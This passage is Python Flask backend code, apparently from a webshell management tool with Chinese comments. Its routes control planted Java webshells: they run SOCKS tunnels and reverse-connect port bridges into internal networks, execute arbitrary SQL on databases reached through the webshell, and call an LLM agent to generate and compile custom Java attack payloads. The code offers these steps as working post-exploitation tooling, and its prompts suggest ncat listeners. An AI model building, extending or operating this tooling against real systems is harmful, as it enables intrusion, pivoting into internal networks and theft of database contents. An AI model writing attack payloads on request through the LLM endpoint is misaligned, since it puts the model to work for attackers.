        })
            
    except Exception as e:
        print(f"[ERROR] 停止Socks隧道失败: {e}")
        print(traceback.format_exc())
        return jsonify({
            'status': 'error',
            'message': f'服务器错误: {str(e)}'
        }), 500


@java_shell_bp.route('/getSocksTunnelStatus', methods=['POST'])
def get_socks_tunnel_status():
    """获取Socks隧道状态"""
    try:
        data = request.json
        if not data:
            return jsonify({'status': 'error', 'message': '请求参数不能为空'}), 400
        
        # 验证必需参数
        required_params = ['webshell_id']
        for param in required_params:
            if not data.get(param):
                return jsonify({'status': 'error', 'message': f'缺少必需参数: {param}'}), 400
        
        webshell_id = data['webshell_id']
        
        print(f"[INFO] 获取Socks隧道状态")
        
        # 获取TunnelService实例
        service_key = webshell_id
        if service_key not in tunnel_services:
            return jsonify({
                'status': 'success',
                'message': '获取Socks隧道状态成功',
                'data': {
                    'isRunning': False,
                    'listenPort': None,
                    'listenIp': None,
                    'ipWhitelist': [],
                    'activeConnections': 0,
                    'socksVersion': None
                }
            })
        
        service = tunnel_services[service_key]
        
        # 获取服务状态
        try:
            status_data = {
                'isRunning': service.is_running,
                'listenPort': service.server_socket.getsockname()[1] if service.server_socket else None,
                'listenIp': service.server_socket.getsockname()[0] if service.server_socket else None,
                'ipWhitelist': service.get_ip_whitelist(),
                'activeConnections': len(service.active_connections),
                'socksVersion': 'SOCKS5'
            }
        except:
            status_data = {
                'isRunning': False,
                'listenPort': None,
                'listenIp': None,
                'ipWhitelist': [],
                'activeConnections': 0,
                'socksVersion': 'SOCKS5'
            }
        
        return jsonify({
            'status': 'success',
            'message': '获取Socks隧道状态成功',
            'data': status_data
        })
            
    except Exception as e:
        print(f"[ERROR] 获取Socks隧道状态失败: {e}")
        print(traceback.format_exc())
        return jsonify({
            'status': 'error',
            'message': f'服务器错误: {str(e)}'
        }), 500


@java_shell_bp.route('/updateSocksWhitelist', methods=['POST'])
def update_socks_whitelist():
    """更新Socks隧道IP白名单"""
    try:
        data = request.json
        if not data:
            return jsonify({'status': 'error', 'message': '请求参数不能为空'}), 400
        
        # 验证必需参数
        required_params = ['webshell_id', 'ipWhitelist']
        for param in required_params:
            if param not in data:
                return jsonify({'status': 'error', 'message': f'缺少必需参数: {param}'}), 400
        
        webshell_id = data['webshell_id']
        ip_whitelist = data['ipWhitelist'] if data['ipWhitelist'] else []
        
        print(f"[INFO] 更新Socks隧道IP白名单: {ip_whitelist}")
        
        # 获取TunnelService实例
        service_key = webshell_id
        if service_key not in tunnel_services:
            return jsonify({
                'status': 'error',
                'message': 'Socks隧道服务未启动'
            }), 404
        
        service = tunnel_services[service_key]
        
        # 更新IP白名单
        service.set_ip_whitelist(ip_whitelist)
        
        return jsonify({
            'status': 'success',
            'message': 'IP白名单更新成功',
            'data': {
                'ipWhitelist': service.get_ip_whitelist()
            }
        })
            
    except Exception as e:
        print(f"[ERROR] 更新Socks隧道IP白名单失败: {e}")
        print(traceback.format_exc())
        return jsonify({
            'status': 'error',
            'message': f'服务器错误: {str(e)}'
        }), 500


# ====== 内网穿透 - 反连端口桥接接口 ======

@java_shell_bp.route('/startReverseConnect', methods=['POST'])
def start_reverse_connect():
    """启动反连端口桥接"""
    try:
        data = request.json
        if not data:
            return jsonify({'status': 'error', 'message': '请求参数不能为空'}), 400
        
        # 验证必需参数
        required_params = ['webshell_id', 'listenId', 'webshellPort']
        for param in required_params:
            if not data.get(param):
                return jsonify({'status': 'error', 'message': f'缺少必需参数: {param}'}), 400
        
        webshell_id = data['webshell_id']
        listen_id = data['listenId']
        webshell_port = int(data['webshellPort'])
        local_ip = data.get('localIp', '127.0.0.1')
        local_port = data.get('localPort')
        
        print(f"[INFO] 启动反连端口桥接: {listen_id}, webshell端口: {webshell_port}")
        
        # 获取webshell实例
        shell = get_or_create_webshell_instance_by_id(webshell_id)
        if not shell:
            return jsonify({'status': 'error', 'message': 'webshell连接失败'}), 500
        
        # 检查是否为JavaShell类型
        if not hasattr(shell, 'start_reverse_listener'):
            return jsonify({'status': 'error', 'message': '当前webshell类型不支持反连端口桥接功能'}), 400
        
        reverse_connect_class_info = java_payload.getPayload(class_name="ReverseConnect")
        
        if not reverse_connect_class_info:
            return jsonify({'status': 'error', 'message': '无法获取ReverseConnect payload类'}), 500
        
        # 确保ReverseConnect类已加载
        success, reverse_connect_classname, error_msg = ensure_payload_loaded(shell, reverse_connect_class_info, "ReverseConnect", 'ReverseConnect类加载失败')
        if not success:
            return jsonify({'status': 'error', 'message': error_msg}), 500
        
        # 生成service的唯一key（使用webshell_id作为key更简单）
        service_key = webshell_id
        
        # 获取或创建ReverseConnectService实例
        if service_key not in reverse_connect_services:
            try:
                from .java.ReverseConnectService import ReverseConnectService
                service = ReverseConnectService(shell, reverse_connect_classname)
                reverse_connect_services[service_key] = service
                print(f"[DEBUG] ReverseConnectService实例已创建并缓存")
            except ImportError:
                return jsonify({
                    'status': 'error',
                    'message': 'ReverseConnectService模块不可用，反连端口桥接功能暂不支持'
                }), 500
        else:
            service = reverse_connect_services[service_key]
            print(f"[DEBUG] 重用现有的ReverseConnectService实例")
        
        # 启动反连监听
        success = service.start_reverse_listener(listen_id, webshell_port, local_ip, local_port)
        
        if success:
            response_data = {
                'listenId': listen_id,
                'webshellPort': webshell_port,
                'localIp': local_ip,
                'localPort': local_port,
                'instructions': []
            }
            
            # 添加使用说明
            if local_port:
                response_data['instructions'] = [
                    f"1. webshell端已在端口 {webshell_port} 启动监听",
                    f"2. 请在本地 {local_ip}:{local_port} 启动监听器接收反连",
                    f"   建议命令: ncat -lvp {local_port}" if local_ip == "127.0.0.1" else f"   建议命令: ncat -lvp {local_port} (在 {local_ip} 上运行)",
                    f"3. 内网机器可连接 webshell服务器:{webshell_port} 进行反连"
                ]
            else:
                response_data['instructions'] = [
                    f"webshell端已在端口 {webshell_port} 启动监听",
                    f"内网机器可连接 webshell服务器:{webshell_port} 进行反连"
                ]
            
            return jsonify({
                'status': 'success',
                'message': '反连端口桥接启动成功',
                'data': response_data
            })
        else:
            return jsonify({
                'status': 'error',
                'message': f'反连端口桥接启动失败，请检查webshell端口 {webshell_port} 是否已被占用'
            }), 500
            
    except ValueError as e:
        return jsonify({
            'status': 'error',
            'message': f'参数格式错误: {str(e)}'
        }), 400
    except Exception as e:
        print(f"[ERROR] 启动反连端口桥接失败: {e}")
        print(traceback.format_exc())
        return jsonify({
            'status': 'error',
            'message': f'服务器错误: {str(e)}'
        }), 500


@java_shell_bp.route('/stopReverseConnect', methods=['POST'])
def stop_reverse_connect():
    """停止反连端口桥接"""
    try:
        data = request.json
        if not data:
            return jsonify({'status': 'error', 'message': '请求参数不能为空'}), 400
        
        # 验证必需参数
        required_params = ['webshell_id', 'listenId']
        for param in required_params:
            if not data.get(param):
                return jsonify({'status': 'error', 'message': f'缺少必需参数: {param}'}), 400
        
        webshell_id = data['webshell_id']
        listen_id = data['listenId']
        
        print(f"[INFO] 停止反连端口桥接: {listen_id}")
        
        # 获取ReverseConnectService实例
        service_key = webshell_id
        if service_key not in reverse_connect_services:
            return jsonify({
                'status': 'error',
                'message': '反连端口桥接服务未启动'
            }), 404
        
        service = reverse_connect_services[service_key]
        
        # 停止反连监听
        success = service.stop_reverse_listener(listen_id)
        
        if success:
            return jsonify({
                'status': 'success',
                'message': '反连端口桥接已停止',
                'data': {
                    'listenId': listen_id
                }
            })
        else:
            return jsonify({
                'status': 'error',
                'message': f'停止反连端口桥接失败，监听器 {listen_id} 可能不存在'
            }), 500
            
    except Exception as e:
        print(f"[ERROR] 停止反连端口桥接失败: {e}")
        print(traceback.format_exc())
        return jsonify({
            'status': 'error',
            'message': f'服务器错误: {str(e)}'
        }), 500


@java_shell_bp.route('/getReverseConnectStatus', methods=['POST'])
def get_reverse_connect_status():
    """获取反连端口桥接状态"""
    try:
        data = request.json
        if not data:
            return jsonify({'status': 'error', 'message': '请求参数不能为空'}), 400
        
        # 验证必需参数
        required_params = ['webshell_id']
        for param in required_params:
            if not data.get(param):
                return jsonify({'status': 'error', 'message': f'缺少必需参数: {param}'}), 400
        
        webshell_id = data['webshell_id']
        
        print(f"[INFO] 获取反连端口桥接状态")
        
        # 获取ReverseConnectService实例
        service_key = webshell_id
        if service_key not in reverse_connect_services:
            return jsonify({
                'status': 'success',
                'message': '获取反连端口桥接状态成功',
                'data': {
                    'active_listeners': 0,
                    'active_connections': 0,
                    'listeners': [],
                    'connections': []
                }
            })
        
        service = reverse_connect_services[service_key]
        
        # 获取服务状态
        try:
            status_data = service.get_reverse_status()
        except:
            status_data = {
                'active_listeners': 0,
                'active_connections': 0,
                'listeners': [],
                'connections': []
            }
        
        return jsonify({
            'status': 'success',
            'message': '获取反连端口桥接状态成功',
            'data': status_data
        })
            
    except Exception as e:
        print(f"[ERROR] 获取反连端口桥接状态失败: {e}")
        print(traceback.format_exc())
        return jsonify({
            'status': 'error',
            'message': f'服务器错误: {str(e)}'
        }), 500


@java_shell_bp.route('/stopAllReverseConnects', methods=['POST'])
def stop_all_reverse_connects():
    """停止所有反连端口桥接"""
    try:
        data = request.json
        if not data:
            return jsonify({'status': 'error', 'message': '请求参数不能为空'}), 400
        
        # 验证必需参数
        required_params = ['webshell_id']
        for param in required_params:
            if not data.get(param):
                return jsonify({'status': 'error', 'message': f'缺少必需参数: {param}'}), 400
        
        webshell_id = data['webshell_id']
        
        print(f"[INFO] 停止所有反连端口桥接")
        
        # 获取ReverseConnectService实例
        service_key = webshell_id
        if service_key not in reverse_connect_services:
            return jsonify({
                'status': 'success',
                'message': '没有活跃的反连端口桥接需要停止'
            })
        
        service = reverse_connect_services[service_key]
        
        # 获取所有监听器
        try:
            listener_ids = list(service.active_listeners.keys())
            stopped_count = 0
            
            # 停止所有监听器
            for listen_id in listener_ids:
                if service.stop_reverse_listener(listen_id):
                    stopped_count += 1
            
            # 清理服务实例
            if stopped_count > 0 or len(service.active_listeners) == 0:
                del reverse_connect_services[service_key]
            
            return jsonify({
                'status': 'success',
                'message': f'已停止 {stopped_count} 个反连端口桥接'
            })
        except:
            # 如果发生异常，直接清理服务实例
            del reverse_connect_services[service_key]
            return jsonify({
                'status': 'success',
                'message': '反连端口桥接服务已清理'
            })
            
    except Exception as e:
        print(f"[ERROR] 停止所有反连端口桥接失败: {e}")
        print(traceback.format_exc())
        return jsonify({
            'status': 'error',
            'message': f'服务器错误: {str(e)}'
        }), 500

# ====== 数据库管理接口 ======

@java_shell_bp.route('/testDatabaseConnection', methods=['POST'])
def test_database_connection():
    """测试数据库连接"""
    try:
        data = request.json
        if not data:
            return jsonify({'status': 'error', 'message': '请求参数不能为空'}), 400
        
        # 验证必需参数
        required_params = ['webshell_id', 'dbType', 'host', 'port', 'username', 'dbPassword']
        for param in required_params:
            if param not in data:
                return jsonify({'status': 'error', 'message': f'缺少必需参数: {param}'}), 400
        
        webshell_id = data['webshell_id']
        db_type = data['dbType']
        db_host = data['host']
        db_port = data['port']
        db_username = data['username']
        db_password = data['dbPassword']  # 这是数据库密码
        
        print(f"[INFO] 测试数据库连接: {db_type}://{db_host}:{db_port}")
        
        # 获取webshell实例
        shell = get_or_create_webshell_instance_by_id(webshell_id)
        if not shell:
            return jsonify({'status': 'error', 'message': 'webshell连接失败'}), 500
        
        # 检查是否为JavaShell类型
        if not hasattr(shell, 'test_database_connection'):
            return jsonify({'status': 'error', 'message': '当前webshell类型不支持数据库功能'}), 400
        
        database_manager_class_info = java_payload.getPayload(class_name="DatabaseManager")
        
        if not database_manager_class_info:
            return jsonify({'status': 'error', 'message': '无法获取DatabaseManager payload类'}), 500
        
        # 确保DatabaseManager类已加载
        success, database_manager_classname, error_msg = ensure_payload_loaded(shell, database_manager_class_info, "DatabaseManager", 'DatabaseManager类加载失败')
        if not success:
            return jsonify({'status': 'error', 'message': error_msg}), 500
        
        # 执行数据库连接测试
        print(f"[DEBUG] 执行数据库连接测试，使用类名: {database_manager_classname}")
        
        success, result_message = shell.test_database_connection(
            db_type=db_type,
            db_host=db_host,
            db_port=db_port,
            db_username=db_username,
            db_password=db_password,
            className=database_manager_classname
        )
        
        if success:
            print(f"[SUCCESS] 数据库连接测试成功: {result_message}")
            return jsonify({
                'status': 'success',
                'message': '数据库连接测试成功',
                'data': {
                    'dbType': db_type,
                    'host': db_host,
                    'port': db_port,
                    'username': db_username,
                    'connectionDetails': result_message
                }
            })
        else:
            print(f"[ERROR] 数据库连接测试失败: {result_message}")
            return jsonify({
                'status': 'error',
                'message': f'数据库连接测试失败: {result_message}'
            }), 400
        
    except Exception as e:
        print(f"[ERROR] 测试数据库连接失败: {e}")
        print(traceback.format_exc())
        return jsonify({
            'status': 'error',
            'message': f'服务器错误: {str(e)}'
        }), 500


@java_shell_bp.route('/executeSql', methods=['POST'])
def execute_sql():
    """执行SQL语句"""
    try:
        data = request.json
        if not data:
            return jsonify({'status': 'error', 'message': '请求参数不能为空'}), 400
        
        # 验证必需参数
        required_params = ['webshell_id', 'dbType', 'host', 'port', 'username', 'dbPassword', 'sql']
        for param in required_params:
            if param not in data:
                return jsonify({'status': 'error', 'message': f'缺少必需参数: {param}'}), 400
        
        webshell_id = data['webshell_id']
        db_type = data['dbType']
        db_host = data['host']
        db_port = data['port']
        db_username = data['username']
        db_password = data['dbPassword']  # 这是数据库密码
        sql_query = data['sql']
        
        # 验证SQL不为空
        if not sql_query or not sql_query.strip():
            return jsonify({'status': 'error', 'message': 'SQL语句不能为空'}), 400
        
        print(f"[INFO] 执行SQL语句: {db_type}://{db_host}:{db_port}")
        print(f"[DEBUG] SQL: {sql_query[:200]}{'...' if len(sql_query) > 200 else ''}")
        
        # 获取webshell实例
        shell = get_or_create_webshell_instance_by_id(webshell_id)
        if not shell:
            return jsonify({'status': 'error', 'message': 'webshell连接失败'}), 500
        
        # 检查是否为JavaShell类型
        if not hasattr(shell, 'exec_sql'):
            return jsonify({'status': 'error', 'message': '当前webshell类型不支持数据库功能'}), 400
        
        database_manager_class_info = java_payload.getPayload(class_name="DatabaseManager")
        
        if not database_manager_class_info:
            return jsonify({'status': 'error', 'message': '无法获取DatabaseManager payload类'}), 500
        
        # 确保DatabaseManager类已加载
        success, database_manager_classname, error_msg = ensure_payload_loaded(shell, database_manager_class_info, "DatabaseManager", 'DatabaseManager类加载失败')
        if not success:
            return jsonify({'status': 'error', 'message': error_msg}), 500
        
        # 判断是查询还是更新操作
        sql_lower = sql_query.strip().lower()
        is_select_query = sql_lower.startswith('select') or sql_lower.startswith('show') or sql_lower.startswith('desc') or sql_lower.startswith('explain')
        exec_type = 'select' if is_select_query else 'update'
        
        print(f"[DEBUG] SQL类型判断: {exec_type}")
        
        # 执行SQL语句
        success, result = shell.exec_sql(
            db_type=db_type,
            db_host=db_host,
            db_port=db_port,
            db_username=db_username,
            db_password=db_password,
            exec_type=exec_type,
            exec_sql=sql_query,
            className=database_manager_classname
        )
        
        if success:
            print(f"[SUCCESS] SQL执行成功")
            
            if exec_type == 'select':
                # 处理查询结果
                try:
                    # 解析返回的数据
                    parsed_data = parse_database_query_result(result)
                    return jsonify({
                        'status': 'success',
                        'message': 'SQL查询执行成功',
                        'data': parsed_data,
                        'queryType': 'select'
                    })
                except Exception as parse_error:
                    print(f"[ERROR] 解析查询结果失败: {parse_error}")
                    return jsonify({
                        'status': 'error',
                        'message': f'解析查询结果失败: {str(parse_error)}'
                    }), 500
            else:
                # 处理更新结果
                return jsonify({
                    'status': 'success',
                    'message': 'SQL执行成功',
                    'data': result,
                    'queryType': 'update'
                })
        else:
            print(f"[ERROR] SQL执行失败: {result}")
            return jsonify({
                'status': 'error',
                'message': f'SQL执行失败: {result}'
            }), 400
        
    except Exception as e:
        print(f"[ERROR] 执行SQL失败: {e}")
        print(traceback.format_exc())
        return jsonify({
            'status': 'error',
            'message': f'服务器错误: {str(e)}'
        }), 500

@java_shell_bp.route('/generatePayload', methods=['POST'])
def generate_payload():
    from .agent import JavaPayloadAgent, PayloadAgentConfig
    """根据需求生成自定义 Java Payload 源码"""
    try:
        data = request.json or {}
        requirement = (data.get('requirement') or '').strip()
        if not requirement:
            return jsonify({'status': 'error', 'message': '需求描述不能为空'}), 400

        llm_cfg = global_config.load_global_config().get('llm', {})
        provider = (llm_cfg.get('provider') or 'openai').strip()
        base_url = (llm_cfg.get('baseUrl') or '').strip()
        model_name = (llm_cfg.get('model') or '').strip()
        api_key = (llm_cfg.get('apiKey') or '').strip()
        temperature = float(llm_cfg.get('temperature', 0.1) or 0.1)
        max_compile_attempts = 3

        if not api_key:
            return jsonify({
                'status': 'error',
                'message': 'LLM API Key 未配置，请先在 WebshellConfig 中保存 LLM 配置'
            }), 400
        if not model_name:
            return jsonify({
                'status': 'error',
                'message': 'LLM 模型名称未配置，请先在 WebshellConfig 中保存 LLM 配置'
            }), 400
        if provider not in ['openai', 'codex_proxy', 'gemini_proxy']:
            return jsonify({
                'status': 'error',
                'message': f'不支持的 LLM provider: {provider}'
            }), 400
        if provider in ('codex_proxy', 'gemini_proxy') and not base_url:
            return jsonify({
                'status': 'error',
                'message': f'使用 {provider} 时必须配置 Base URL'
            }), 400

        agent = JavaPayloadAgent(
            PayloadAgentConfig(
                api_key=api_key,
                model_name=model_name,
                base_url=base_url or None,
                provider=provider,
                temperature=temperature,
                max_compile_attempts=max_compile_attempts,
            )
        )
        result = agent.run(requirement)

        generated_code = result.get('generated_code', '') or ''
        if not generated_code.strip():
            return jsonify({
                'status': 'error',
                'message': result.get('compile_message') or 'AI 未返回可用的 Java Payload 源码',
                'data': result,
            }), 400

        try:
            class_name = java_payload.extract_class_name_from_source(generated_code)
        except Exception:
            class_name = ''

        if not result.get('compile_success'):
            return jsonify({
                'status': 'error',
                'message': result.get('compile_message') or 'Java Payload 生成失败',
                'data': {
                    'payloadCode': generated_code,
                    'className': class_name,
                    'methodName': result.get('method_name', ''),
                    'paramExample': result.get('param_example', {}),
                    'compileSuccess': False,
                    'compileAttempts': result.get('compile_attempts', 0),
                    'compileMessage': result.get('compile_message', ''),
                    'rawResponse': result.get('raw_response', ''),
                }
            }), 400

        return jsonify({
            'status': 'success',
            'message': 'Java Payload 生成成功',
            'data': {
                'payloadCode': generated_code,
                'className': class_name,
                'methodName': result.get('method_name', ''),
                'paramExample': result.get('param_example', {}),
                'compileSuccess': True,
                'compileAttempts': result.get('compile_attempts', 0),
                'compileMessage': result.get('compile_message', ''),
                'rawResponse': result.get('raw_response', ''),
            }
        })
    except ValueError as e:
        return jsonify({'status': 'error', 'message': str(e)}), 400
    except Exception as e:
        print(traceback.format_exc())
        return jsonify({
            'status': 'error',
            'message': f'生成 Payload 失败: {str(e)}'
        }), 500

def parse_database_query_result(result_data):
    """
    解析数据库查询结果
    
    结果格式通常是：
    列名1    列名2    列名3
    值1     值2      值3
    值4     值5      值6
    ...
    
    其中列名和值都可能是Base64编码的
    """
    try:
        if not result_data or not result_data.strip():
            return []
        
        lines = result_data.strip().split('\n')
        if len(lines) < 2:  # 至少需要表头和一行数据
            return []
        
        # 解析表头（列名）
        header_line = lines[0]
        column_names = []
        
        # 按制表符分割并解码Base64
        raw_columns = header_line.split('\t')
        for col in raw_columns:
            if col.strip():
                try:
                    # 尝试Base64解码
                    import base64
                    decoded_col = base64.b64decode(col.strip()).decode('utf-8')
                    column_names.append(decoded_col)
                except Exception:
                    # 如果解码失败，直接使用原始值
                    column_names.append(col.strip())
        
        if not column_names:
            return []
        
        # 解析数据行
        result_rows = []
        for line_index in range(1, len(lines)):
            line = lines[line_index].strip()
            if not line:
                continue
            
            # 按制表符分割并解码Base64
            raw_values = line.split('\t')
            row_data = {}
            
            for i, raw_value in enumerate(raw_values):
                if i < len(column_names):
                    column_name = column_names[i]
                    
                    if raw_value.strip():
                        try:
                            # 尝试Base64解码
                            import base64
                            decoded_value = base64.b64decode(raw_value.strip()).decode('utf-8')
                            row_data[column_name] = decoded_value
                        except Exception:
                            # 如果解码失败，直接使用原始值
                            row_data[column_name] = raw_value.strip()
                    else:
                        row_data[column_name] = ''
            
            result_rows.append(row_data)
        
        print(f"[DEBUG] 解析查询结果成功: {len(result_rows)} 行, 列: {column_names}")
        return result_rows
        
    except Exception as e:
        print(f"[ERROR] 解析数据库查询结果失败: {e}")
        print(f"[DEBUG] 原始数据: {result_data[:500]}...")
        raise e
